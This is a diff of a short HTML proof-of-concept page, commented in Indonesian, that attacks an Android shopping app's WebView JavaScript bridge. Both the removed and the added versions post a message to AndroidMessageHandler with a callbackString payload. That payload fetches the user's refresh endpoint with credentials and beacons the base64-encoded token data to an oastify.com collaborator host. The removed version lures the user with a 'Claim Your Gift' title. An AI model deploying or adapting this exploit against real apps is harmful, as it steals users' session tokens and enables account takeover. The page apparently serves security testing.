@@ -1,36 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-     <title>Claim Your Gift</title>
-</head>
-<body>
-     <script>
-         window.onload = function() {
-             // Kita pastikan bridge tersedia
-             if (window.AndroidMessageHandler) {
-                 // ALUR EKSPLOITASI:
-                 // 1. Perintah 'open-url' akan memaksa WebView Oda pindah ke domain oda.com
-                 // 2. 'callbackString' berisi payload pencurian token yang akan dieksekusi 
-                 //    segera setelah navigasi dipicu.
-                 
-                 var burpId = "6r0scpub5r7ov82xaofydx5xwzn5et5hu.oastify.com";
-                 var payload = `
-                     fetch('/api/v1/user/refresh', {credentials: 'include'})
-                     .then(r => r.text())
-                     .then(data => {
-                         // Kirim data sensitif ke Burp Collaborator penyerang
-                         new Image().src = "https://${burpId}/pwned?token=" + btoa(data);
-                     });
-                 `;
-
-                 AndroidMessageHandler.postMessage(JSON.stringify({
-                     command: "open-url",
-                     url: "https://oda.com/no/account/gift-cards/", // Pindah ke domain terpercaya
-                     title: "GIFT_CARD_VALIDATED",
-                     callbackString: payload
-                 }));
-             }
-         };
-     </script>
-</body>
+<script>
+    window.onload = function() {
+        if (window.AndroidMessageHandler) {
+            // Kita picu transisi ke layar native 'cart'
+            // Sambil menyuntikkan script untuk mencuri data dari halaman yang sedang dibuka
+            AndroidMessageHandler.postMessage(JSON.stringify({
+                command: "open-native-url",
+                url: "kolonialno://cart", 
+                callbackString: "fetch('/api/v1/user/refresh', {credentials: 'include'}).then(r=>r.text()).then(d=>{new Image().src='https://eq8zfh1shueiypnxe2o0nsnjpav1ju7j.oastify.com/leak?data='+btoa(d);});"
+            }));
+        }
+    };
+</script>
 </html>
